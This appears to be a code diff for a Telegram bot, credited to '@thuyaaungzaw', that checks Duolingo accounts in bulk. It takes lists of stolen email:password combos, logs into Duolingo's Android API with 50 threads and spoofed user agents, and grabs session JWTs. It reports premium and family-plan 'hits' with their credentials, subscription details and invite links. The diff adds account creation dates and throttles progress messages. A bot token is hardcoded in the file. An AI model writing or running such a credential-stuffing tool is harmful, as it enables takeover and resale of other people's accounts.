@@ -11,7 +11,8 @@ from concurrent.futures import ThreadPoolExecutor, as_completed
 # ========== CONFIGURATION ==========
 BOT_TOKEN = "8689449943:AAHFZdaE4L0TkH6S9BAAtmdWbwoTJYyzcJQ"
 ADMIN_ID = 8770379893
-MAX_THREADS = 50  # Thread 50 ပုံသေ
+MAX_THREADS = 50
+PROGRESS_UPDATE_INTERVAL = 100  # အကောင့် 100 ကြောင်းစစ်မှ update
 # ===================================
 
 logging.basicConfig(format='%(asctime)s - %(message)s', level=logging.INFO, datefmt='%H:%M:%S')
@@ -40,21 +41,6 @@ def generate_ua():
     versions = ["10", "11", "12", "13"]
     models = ["SM-G991B", "Pixel 6", "OnePlus 9", "Xiaomi Mi 11"]
     return f"Dalvik/2.1.0 (Linux; U; Android {versions[hash(str(time.time())) % len(versions)]}; {models[hash(str(time.time())) % len(models)]} Build/RP1A.200720.012)"
-
-def get_error_type(exception):
-    error_str = str(exception).lower()
-    if "timeout" in error_str:
-        return "⏱️ Timeout"
-    elif "connection" in error_str:
-        return "🔌 Connection Error"
-    elif "406" in error_str:
-        return "🚫 406 - Not Acceptable"
-    elif "429" in error_str:
-        return "🐌 429 - Rate Limit"
-    elif "500" in error_str or "502" in error_str or "503" in error_str:
-        return "⚠️ Server Error"
-    else:
-        return f"❌ {str(exception)[:30]}"
 
 def is_premium_account(data):
     shop_items = data.get("shopItems", [])
@@ -112,12 +98,10 @@ def extract_subscription_details(data, plan_type):
     return details
 
 def check_single_account(email, password):
-    """Single account check - for threading"""
     session = requests.Session()
     ua = generate_ua()
     
     try:
-        # Login
         login_url = "https://android-api.duolingo.cn/2017-06-30/login?fields=id"
         distinct_id = str(uuid.uuid4())
         
@@ -140,7 +124,6 @@ def check_single_account(email, password):
         if not user_id:
             return email, password, "FAIL", "no user id", None
         
-        # Get JWT
         jwt_token = None
         for cookie in session.cookies:
             if cookie.name == "jwt_token":
@@ -150,7 +133,7 @@ def check_single_account(email, password):
         if not jwt_token:
             return email, password, "FAIL", "no jwt token", None
         
-        # Get profile
+        # Profile with createdAt field
         profile_url = f"https://android-api.duolingo.cn/2023-05-23/users/{user_id}?fields=shopItems%2CtotalXp%2CstreakData%2Cusername%2CfromLanguage%2ClearningLanguage%2CgemsConfig%2ChasPlus%2Chas_item_premium_subscription%2CsubscriptionConfigs%2CplusDiscounts%2CcreatedAt"
         
         profile_headers = get_headers(ua, jwt_token)
@@ -168,7 +151,19 @@ def check_single_account(email, password):
         streak = data.get("streakData", {}).get("length", 0) if data.get("streakData") else 0
         learning_lang = data.get("learningLanguage", "N/A")
         from_lang = data.get("fromLanguage", "N/A")
-        created_at = data.get("createdAt", "Unknown")
+        
+        # Get createdAt - convert to readable date
+        created_at_raw = data.get("createdAt", None)
+        if created_at_raw:
+            try:
+                if isinstance(created_at_raw, (int, float)):
+                    created_date = datetime.fromtimestamp(created_at_raw / 1000).strftime("%Y-%m-%d")
+                else:
+                    created_date = str(created_at_raw)[:10]
+            except:
+                created_date = "Unknown"
+        else:
+            created_date = "Unknown"
         
         # Check premium
         is_premium, plan_type, invite_token = is_premium_account(data)
@@ -192,14 +187,13 @@ def check_single_account(email, password):
 ├─ Total XP: `{total_xp:,}`
 ├─ Streak: `{streak} days` 🔥
 ├─ Learning: `{learning_lang}` (from `{from_lang}`)
+├─ Created: `{created_date}`
 └─ Plan: 👨‍👩‍👧 **FAMILY PLAN**
 
 💎 **SUBSCRIPTION:**
 ├─ Product: `{sub_details['product_id']}`
 ├─ Renew: `{sub_details['renewing']}`
 └─ Expires: `{sub_details['expiry']}`
-
-📅 Created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
 """
             if sub_details["invite_token"]:
                 result += f"\n🔗 **INVITE LINK:**\nhttps://www.duolingo.com/family-plan?invite={sub_details['invite_token']}"
@@ -213,14 +207,13 @@ def check_single_account(email, password):
 ├─ Total XP: `{total_xp:,}`
 ├─ Streak: `{streak} days` 🔥
 ├─ Learning: `{learning_lang}` (from `{from_lang}`)
+├─ Created: `{created_date}`
 └─ Plan: 👑 **SUPER PREMIUM**
 
 💎 **SUBSCRIPTION:**
 ├─ Product: `{sub_details['product_id']}`
 ├─ Renew: `{sub_details['renewing']}`
 └─ Expires: `{sub_details['expiry']}`
-
-📅 Created: `{created_at[:10] if created_at != 'Unknown' else 'Unknown'}`
 """
         
         result += f"\n📱 Checked by: [ DUOLINGO ] BY ThuYa V3"
@@ -259,9 +252,9 @@ def process_combos(chat_id, combos, message_id):
     free_accounts = []
     
     completed = 0
-    results = {}
+    last_update = 0
     
-    # Send initial progress
+    # Initial progress message
     progress_text = f"""
 ╔════════════════════════════════════╗
 ║     🦉 DUOLINGO CHECKER            ║
@@ -312,7 +305,6 @@ _Use /stop to cancel_
                 else:
                     super_count += 1
                     super_hits.append((email, password, detail))
-                # Send HIT immediately
                 bot.send_message(chat_id, detail, parse_mode="Markdown")
                 logging.info(f"✅ {plan_type} HIT: {email}")
             elif status == "FREE":
@@ -327,8 +319,9 @@ _Use /stop to cancel_
                 fail_count += 1
                 logging.info(f"❌ FAIL: {email}")
             
-            # Update progress every 10 completions
-            if completed % 10 == 0 or completed == total:
+            # Update progress every 100 completions (to avoid flood control)
+            if completed - last_update >= PROGRESS_UPDATE_INTERVAL or completed == total:
+                last_update = completed
                 progress_bar = make_progress_bar(percent)
                 
                 error_summary = ""
@@ -365,8 +358,8 @@ _Use /stop to cancel_
                 
                 try:
                     bot.edit_message_text(progress_text, chat_id, message_id, parse_mode="Markdown")
-                except:
-                    pass
+                except Exception as e:
+                    logging.warning(f"Progress update failed: {e}")
     
     elapsed = time.time() - start_time
     progress_bar = make_progress_bar(100)
@@ -461,6 +454,7 @@ def start_command(message):
         "⚠️ **FREE** → Login success, no premium\n"
         "❌ **FAIL** → Wrong credentials\n"
         "🔴 **ERROR** → Network/API issue\n\n"
+        "📅 **Created Date** → Account creation date (if available)\n\n"
         "🛑 Use `/stop` to cancel",
         parse_mode="Markdown",
         reply_markup=markup
@@ -521,6 +515,7 @@ def handle_file(message):
 print("🤖 Duolingo Premium Checker Bot is running...")
 print("Config: [ DUOLINGO ] BY ThuYa V3")
 print("Author: @thuyaaungzaw")
-print(f"Threads: {MAX_THREADS} (Concurrent)")
-print("Features: SUPER PREMIUM | FAMILY PLAN | Progress Bar | /stop")
+print(f"Threads: {MAX_THREADS}")
+print(f"Progress Update Interval: {PROGRESS_UPDATE_INTERVAL} combos")
+print("Features: SUPER PREMIUM | FAMILY PLAN | Created Date | Progress Bar | /stop")
 bot.infinity_polling()
